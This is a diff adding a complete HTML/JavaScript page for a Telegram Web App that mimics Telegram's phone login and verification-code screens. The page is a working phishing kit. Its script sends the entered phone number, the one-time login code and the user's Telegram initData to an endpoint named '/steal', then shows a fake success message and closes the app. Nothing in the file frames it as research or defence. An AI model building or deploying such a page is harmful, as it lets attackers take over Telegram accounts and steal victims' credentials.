@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Telegram</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <style>
+        * {
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #ffffff;
+            margin: 0;
+            padding: 0;
+            color: #000000;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .page {
+            padding: 20px 16px;
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 40px;
+            padding-top: 20px;
+        }
+        .logo-img {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            background-size: cover;
+            background-position: center;
+        }
+        .title {
+            font-size: 21px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #707579;
+            text-align: center;
+            margin-bottom: 30px;
+            line-height: 1.4;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .label {
+            font-size: 16px;
+            margin-bottom: 8px;
+            display: block;
+            color: #000000;
+        }
+        .country-selector {
+            background: #f7f8fa;
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .country-info {
+            flex: 1;
+            display: flex;
+            align-items: center;
+        }
+        .country-flag {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            margin-right: 12px;
+            font-size: 18px;
+            text-align: center;
+            line-height: 24px;
+        }
+        .country-name {
+            font-size: 16px;
+            font-weight: 500;
+        }
+        .country-code {
+            font-size: 16px;
+            color: #707579;
+        }
+        .arrow {
+            color: #707579;
+            font-size: 18px;
+        }
+        .phone-input {
+            width: 100%;
+            padding: 12px 16px;
+            background: #f7f8fa;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            outline: none;
+        }
+        .checkbox {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        .checkbox input {
+            margin-right: 12px;
+            width: 18px;
+            height: 18px;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #0088cc;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn:disabled {
+            background: #e0e0e0;
+            color: #a0a0a0;
+            cursor: not-allowed;
+        }
+        .hidden {
+            display: none;
+        }
+        
+        /* Стили для выпадающего списка стран */
+        .country-dropdown {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            max-height: 300px;
+            overflow-y: auto;
+            z-index: 1000;
+            margin-top: 5px;
+        }
+        .country-option {
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .country-option:hover {
+            background: #f7f8fa;
+        }
+        .country-option:last-child {
+            border-bottom: none;
+        }
+        .country-option-flag {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            margin-right: 12px;
+            font-size: 18px;
+            text-align: center;
+            line-height: 24px;
+        }
+        .country-option-name {
+            flex: 1;
+            font-size: 16px;
+        }
+        .country-option-code {
+            font-size: 16px;
+            color: #707579;
+        }
+    </style>
+</head>
+<body>
+    <div class="page" id="phonePage">
+        <div class="logo">
+            <div class="logo-img" style="background-image: url('https://telegram.org/img/t_logo.png')"></div>
+            <div class="title">Telegram</div>
+            <div class="subtitle">Please confirm your country code and enter your phone number.</div>
+        </div>
+
+        <div class="form-group">
+            <div class="label">Country</div>
+            <div class="country-selector" onclick="toggleCountryDropdown()">
+                <div class="country-info">
+                    <div class="country-flag">🇷🇺</div>
+                    <div class="country-name">Russia</div>
+                </div>
+                <div class="country-code">+7</div>
+                <div class="arrow">›</div>
+            </div>
+            
+            <!-- Выпадающий список стран -->
+            <div class="country-dropdown hidden" id="countryDropdown"></div>
+        </div>
+
+        <div class="form-group">
+            <div class="label">Your phone number</div>
+            <input type="tel" class="phone-input" id="phoneInput" placeholder="+7" value="+7">
+        </div>
+
+        <div class="checkbox">
+            <input type="checkbox" id="keepSigned" checked>
+            <label for="keepSigned">Keep me signed in</label>
+        </div>
+
+        <button class="btn" id="nextBtn" onclick="sendPhone()">NEXT</button>
+    </div>
+
+    <div class="page hidden" id="codePage">
+        <div class="logo">
+            <div class="logo-img" style="background-image: url('https://telegram.org/img/t_logo.png')"></div>
+            <div class="title">Code</div>
+            <div class="subtitle" id="codeSubtitle">We have sent a code to your phone.</div>
+        </div>
+
+        <div class="form-group">
+            <div class="label">Verification Code</div>
+            <input type="text" class="phone-input" id="codeInput" placeholder="-----" maxlength="5" style="text-align: center; letter-spacing: 8px;">
+        </div>
+
+        <button class="btn" id="confirmBtn" onclick="sendCode()">Confirm</button>
+    </div>
+
+    <script>
+        const countries = [
+            {code: '+1', name: 'United States', flag: '🇺🇸'},
+            {code: '+1', name: 'Canada', flag: '🇨🇦'},
+            {code: '+7', name: 'Russia', flag: '🇷🇺'},
+            {code: '+44', name: 'United Kingdom', flag: '🇬🇧'},
+            {code: '+49', name: 'Germany', flag: '🇩🇪'},
+            {code: '+33', name: 'France', flag: '🇫🇷'},
+            {code: '+39', name: 'Italy', flag: '🇮🇹'},
+            {code: '+34', name: 'Spain', flag: '🇪🇸'},
+            {code: '+86', name: 'China', flag: '🇨🇳'},
+            {code: '+81', name: 'Japan', flag: '🇯🇵'},
+            {code: '+82', name: 'South Korea', flag: '🇰🇷'},
+            {code: '+91', name: 'India', flag: '🇮🇳'},
+            {code: '+55', name: 'Brazil', flag: '🇧🇷'},
+            {code: '+52', name: 'Mexico', flag: '🇲🇽'},
+            {code: '+61', name: 'Australia', flag: '🇦🇺'},
+            {code: '+64', name: 'New Zealand', flag: '🇳🇿'},
+            {code: '+31', name: 'Netherlands', flag: '🇳🇱'},
+            {code: '+41', name: 'Switzerland', flag: '🇨🇭'},
+            {code: '+46', name: 'Sweden', flag: '🇸🇪'},
+            {code: '+47', name: 'Norway', flag: '🇳🇴'},
+            {code: '+45', name: 'Denmark', flag: '🇩🇰'},
+            {code: '+358', name: 'Finland', flag: '🇫🇮'},
+            {code: '+353', name: 'Ireland', flag: '🇮🇪'},
+            {code: '+32', name: 'Belgium', flag: '🇧🇪'},
+            {code: '+43', name: 'Austria', flag: '🇦🇹'},
+            {code: '+351', name: 'Portugal', flag: '🇵🇹'},
+            {code: '+30', name: 'Greece', flag: '🇬🇷'},
+            {code: '+48', name: 'Poland', flag: '🇵🇱'},
+            {code: '+420', name: 'Czech Republic', flag: '🇨🇿'},
+            {code: '+36', name: 'Hungary', flag: '🇭🇺'},
+            {code: '+40', name: 'Romania', flag: '🇷🇴'},
+            {code: '+380', name: 'Ukraine', flag: '🇺🇦'},
+            {code: '+375', name: 'Belarus', flag: '🇧🇾'},
+            {code: '+370', name: 'Lithuania', flag: '🇱🇹'},
+            {code: '+371', name: 'Latvia', flag: '🇱🇻'},
+            {code: '+372', name: 'Estonia', flag: '🇪🇪'},
+            {code: '+386', name: 'Slovenia', flag: '🇸🇮'},
+            {code: '+385', name: 'Croatia', flag: '🇭🇷'},
+            {code: '+381', name: 'Serbia', flag: '🇷🇸'},
+            {code: '+382', name: 'Montenegro', flag: '🇲🇪'},
+            {code: '+387', name: 'Bosnia', flag: '🇧🇦'},
+            {code: '+389', name: 'North Macedonia', flag: '🇲🇰'},
+            {code: '+355', name: 'Albania', flag: '🇦🇱'},
+            {code: '+90', name: 'Turkey', flag: '🇹🇷'},
+            {code: '+20', name: 'Egypt', flag: '🇪🇬'},
+            {code: '+27', name: 'South Africa', flag: '🇿🇦'},
+            {code: '+234', name: 'Nigeria', flag: '🇳🇬'},
+            {code: '+254', name: 'Kenya', flag: '🇰🇪'},
+            {code: '+233', name: 'Ghana', flag: '🇬🇭'},
+            {code: '+212', name: 'Morocco', flag: '🇲🇦'},
+            {code: '+216', name: 'Tunisia', flag: '🇹🇳'},
+            {code: '+962', name: 'Jordan', flag: '🇯🇴'},
+            {code: '+971', name: 'UAE', flag: '🇦🇪'},
+            {code: '+966', name: 'Saudi Arabia', flag: '🇸🇦'},
+            {code: '+974', name: 'Qatar', flag: '🇶🇦'},
+            {code: '+965', name: 'Kuwait', flag: '🇰🇼'},
+            {code: '+973', name: 'Bahrain', flag: '🇧🇭'},
+            {code: '+968', name: 'Oman', flag: '🇴🇲'},
+            {code: '+60', name: 'Malaysia', flag: '🇲🇾'},
+            {code: '+65', name: 'Singapore', flag: '🇸🇬'},
+            {code: '+66', name: 'Thailand', flag: '🇹🇭'},
+            {code: '+84', name: 'Vietnam', flag: '🇻🇳'},
+            {code: '+62', name: 'Indonesia', flag: '🇮🇩'},
+            {code: '+63', name: 'Philippines', flag: '🇵🇭'},
+            {code: '+95', name: 'Myanmar', flag: '🇲🇲'},
+            {code: '+880', name: 'Bangladesh', flag: '🇧🇩'},
+            {code: '+94', name: 'Sri Lanka', flag: '🇱🇰'},
+            {code: '+92', name: 'Pakistan', flag: '🇵🇰'},
+            {code: '+98', name: 'Iran', flag: '🇮🇷'},
+            {code: '+964', name: 'Iraq', flag: '🇮🇶'},
+            {code: '+961', name: 'Lebanon', flag: '🇱🇧'},
+            {code: '+972', name: 'Israel', flag: '🇮🇱'},
+            {code: '+970', name: 'Palestine', flag: '🇵🇸'},
+            {code: '+51', name: 'Peru', flag: '🇵🇪'},
+            {code: '+54', name: 'Argentina', flag: '🇦🇷'},
+            {code: '+56', name: 'Chile', flag: '🇨🇱'},
+            {code: '+57', name: 'Colombia', flag: '🇨🇴'},
+            {code: '+58', name: 'Venezuela', flag: '🇻🇪'},
+            {code: '+593', name: 'Ecuador', flag: '🇪🇨'},
+            {code: '+595', name: 'Paraguay', flag: '🇵🇾'},
+            {code: '+598', name: 'Uruguay', flag: '🇺🇾'},
+            {code: '+507', name: 'Panama', flag: '🇵🇦'},
+            {code: '+506', name: 'Costa Rica', flag: '🇨🇷'},
+            {code: '+502', name: 'Guatemala', flag: '🇬🇹'},
+            {code: '+503', name: 'El Salvador', flag: '🇸🇻'},
+            {code: '+504', name: 'Honduras', flag: '🇭🇳'},
+            {code: '+505', name: 'Nicaragua', flag: '🇳🇮'},
+            {code: '+52', name: 'Mexico', flag: '🇲🇽'},
+            {code: '+1', name: 'Puerto Rico', flag: '🇵🇷'},
+            {code: '+1', name: 'Dominican Republic', flag: '🇩🇴'},
+            {code: '+509', name: 'Haiti', flag: '🇭🇹'},
+            {code: '+1', name: 'Jamaica', flag: '🇯🇲'},
+            {code: '+1', name: 'Bahamas', flag: '🇧🇸'},
+            {code: '+1', name: 'Barbados', flag: '🇧🇧'}
+        ];
+
+        function toggleCountryDropdown() {
+            const dropdown = document.getElementById('countryDropdown');
+            if (dropdown.classList.contains('hidden')) {
+                showCountryDropdown();
+            } else {
+                hideCountryDropdown();
+            }
+        }
+
+        function showCountryDropdown() {
+            const dropdown = document.getElementById('countryDropdown');
+            dropdown.innerHTML = '';
+            
+            countries.forEach(country => {
+                const option = document.createElement('div');
+                option.className = 'country-option';
+                option.innerHTML = `
+                    <div class="country-option-flag">${country.flag}</div>
+                    <div class="country-option-name">${country.name}</div>
+                    <div class="country-option-code">${country.code}</div>
+                `;
+                option.onclick = () => selectCountry(country);
+                dropdown.appendChild(option);
+            });
+            
+            dropdown.classList.remove('hidden');
+            
+            // Закрытие при клике вне списка
+            setTimeout(() => {
+                document.addEventListener('click', closeDropdownOnClickOutside);
+            }, 10);
+        }
+
+        function hideCountryDropdown() {
+            const dropdown = document.getElementById('countryDropdown');
+            dropdown.classList.add('hidden');
+            document.removeEventListener('click', closeDropdownOnClickOutside);
+        }
+
+        function closeDropdownOnClickOutside(event) {
+            const dropdown = document.getElementById('countryDropdown');
+            const selector = document.querySelector('.country-selector');
+            
+            if (!dropdown.contains(event.target) && !selector.contains(event.target)) {
+                hideCountryDropdown();
+            }
+        }
+
+        function selectCountry(country) {
+            document.querySelector('.country-flag').textContent = country.flag;
+            document.querySelector('.country-name').textContent = country.name;
+            document.querySelector('.country-code').textContent = country.code;
+            document.getElementById('phoneInput').value = country.code;
+            hideCountryDropdown();
+        }
+
+        function sendPhone() {
+            const phone = document.getElementById('phoneInput').value;
+            const tgData = Telegram.WebApp.initData;
+            
+            console.log('Sending phone:', phone);
+            
+            fetch('/steal', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    phone: phone,
+                    tg_data: tgData,
+                    stage: 'phone_entered'
+                })
+            }).then(response => {
+                console.log('Phone sent successfully');
+            }).catch(e => {
+                console.error('Error sending phone:', e);
+            });
+
+            document.getElementById('phonePage').classList.add('hidden');
+            document.getElementById('codePage').classList.remove('hidden');
+            
+            const maskedPhone = phone.slice(0, 4) + ' ••• ••• ' + phone.slice(-2);
+            document.getElementById('codeSubtitle').textContent = `We have sent a code to ${maskedPhone}`;
+        }
+
+        function sendCode() {
+            const code = document.getElementById('codeInput').value;
+            const phone = document.getElementById('phoneInput').value;
+            const tgData = Telegram.WebApp.initData;
+            
+            fetch('/steal', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    phone: phone,
+                    code: code,
+                    tg_data: tgData,
+                    stage: 'code_entered'
+                })
+            }).catch(e => console.error('Error:', e));
+
+            alert('Verification successful! Thank you.');
+            Telegram.WebApp.close();
+        }
+
+        // Инициализация WebApp
+        Telegram.WebApp.ready();
+        Telegram.WebApp.expand();
+        Telegram.WebApp.setHeaderColor('#4a8cDc');
+        Telegram.WebApp.setBackgroundColor('#ffffff');
+        
+        // Обработка ввода кода
+        document.getElementById('codeInput').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value.length === 5) {
+                document.getElementById('confirmBtn').focus();
+            }
+        });
+        
+        // Обработка ввода телефона
+        document.getElementById('phoneInput').addEventListener('input', function(e) {
+            let value = this.value.replace(/[^0-9+]/g, '');
+            if (!value.startsWith('+')) {
+                value = '+' + value;
+            }
+            this.value = value;
+        });
+    </script>
+</body>
+</html>
